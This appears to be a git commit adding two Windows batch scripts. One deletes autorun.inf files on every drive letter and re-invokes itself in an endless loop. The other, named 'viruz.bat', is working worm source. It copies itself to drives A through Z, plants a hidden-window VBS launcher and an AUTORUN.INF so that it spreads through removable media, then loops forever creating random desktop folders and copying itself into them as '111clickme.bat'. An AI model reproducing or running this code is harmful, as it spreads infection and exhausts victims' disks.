1ae21ae5ca9736a575f48dd2e0e6b6256834d3d5
Liu-Wen-Yuan <15816141883@163.com>
2019-02-15 16:19:55 +0800

    delet

---
+++ ATORDELET.bat
@@ -0,0 +1,55 @@
+@echo off
+
+a:
+del /s /q autorun.inf
+b:
+del /s /q autorun.inf
+c:
+del /s /q autorun.inf
+d:
+del /s /q autorun.inf
+e:
+del /s /q autorun.inf
+f:
+del /s /q autorun.inf
+g:
+del /s /q autorun.inf
+h:
+del /s /q autorun.inf
+i:
+del /s /q autorun.inf
+j:
+del /s /q autorun.inf
+k:
+del /s /q autorun.inf
+l:
+del /s /q autorun.inf
+m:
+del /s /q autorun.inf
+n:
+del /s /q autorun.inf
+o:
+del /s /q autorun.inf
+p:
+del /s /q autorun.inf
+q:
+del /s /q autorun.inf
+r:
+del /s /q autorun.inf
+s:
+del /s /q autorun.inf
+t:
+del /s /q autorun.inf
+u:
+del /s /q autorun.inf
+v:
+del /s /q autorun.inf
+w:
+del /s /q autorun.inf
+x:
+del /s /q autorun.inf
+y:
+del /s /q autorun.inf
+z:
+del /s /q autorun.inf
+%0
---
+++ viruz.bat
@@ -0,0 +1,147 @@
+@ECHO OFF
+a:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun] > AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+b:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+c:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+d:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+e:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+f:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+g:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+h:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+i:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+j:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+k:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+l:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+m:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+n:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+o:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+p:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+q:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+r:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+s:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+t:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+u:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+v:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+w:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+x:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+y:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+z:
+copy %0 11.bat>nul
+echo CreateObject("wscript.shell").run "cmd /c 11.bat",0 > RUNME.VBS
+echo [autorun]>AUTORUN.INF
+echo open=wscript RUNME.vbs>>AUTORUN.INF
+cd /d %~dp0
+echo VIRUZ>%~dp0\FCK.TXT
+
+:B
+GOTO A
+:A
+mkdir %userprofile%\Desktop\mkf\
+set a=%userprofile%\Desktop\mkf\%random%
+md %a%.>nul
+cd %a%.>nul
+copy %0 111clickme.bat>nul
+GOTO A
+GOTO B
+
+GOTO A
+GOTO B
